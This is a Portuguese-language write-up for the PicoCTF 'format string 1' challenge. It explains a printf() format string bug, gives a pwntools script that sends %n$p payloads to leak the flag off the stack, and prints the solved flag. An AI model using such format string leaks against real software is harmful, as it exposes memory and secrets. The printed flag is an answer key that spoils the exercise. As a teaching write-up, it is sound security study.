# WriteUp: format string 1
## Descrição do Desafio:
**Author**: Syreal \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/434?category=6&page=1) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Médio \
**Data**: 2024 \
**Descrição**:
> Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

## Passo a Passo da Solução 
### 1. Análise do arquivo fornecido
Assim como o anterior, este desafio fornece seu arquivo fonte `.c`. Analisando ele, podemos ver que ele abre 3 arquivos: `secret-menu-item-1.txt`, `flag.txt`, e `secret-menu-item-2.txt`.

Porém, não há nada de mais acontecendo com esses arquivos, mas no final da função `main()` podemos notar a vulnerabilidade, o buffer que nós escrevemos é passado diretamente para a função `printf()`, então, se nosso input conter formats strings, a `printf()` irá interpretar eles, e para nossa alegria, a flag está declarada na pilha.
```c
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
```

### 2. Exploit
O exploit desse desafio é conhecido como `format string bug`, e ele consiste em abusar desse bug, que é o buffer ser passado diretamente na `printf()`, para alterar variáveis ou ver coisas na pilha. Como a vulnerabilidade acontece após a flag ser declarada, é possível encontrar a flag na pilha por meio desse bug.

### 3. Solução
Tudo o que temos que fazer é identificar em qual posição da pilha está nossa flag, e com isso ler ela usando operadores como `%pos$p`. O desafio é encontrar em qual posição está a flag, mas debugando com o GDB é possível encontrar facilmente ela nas posições 14 à 18.

Porém, se você estiver usando o pwntools se atente ao valor que será impresso, pois esse valor estará em hexadecimal e em little-endian. A forma como eu optei fazer, foi por meio de inverter a string, e transformar para bytes, e após isso concatenava com a flag.

### 3.1 Solução com Python
```py
from pwn import *

p = remote(ip, porta) #Troque pelos valores fornecidos

#Montando payload para pegar os valores das posições 14 a 18.
payload = ""
for i in range(14, 19):
    payload += f"%{str(i)}$p-"

#Fazerndo o format string bug
p.sendlineafter(b"to you:\n", payload)
p.recvuntil(b"order: ")
flag_list = p.recvline().decode().split("-")

#Montando a flag
flag = ""
for i in flag_list:
    x = i[2:] #Retirando o 0x
    x = ''.join([x[i:i+2] for i in range(len(x)-2, -1, -2)]) #Invertendo por byte
    bytes_string = bytes.fromhex(x)
    flag += bytes_string.decode('ascii')

print(flag)
```

### Flag
`picoCTF{4n1m41_57y13_4x4_f14g_9135fd4e}`

## Autor
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
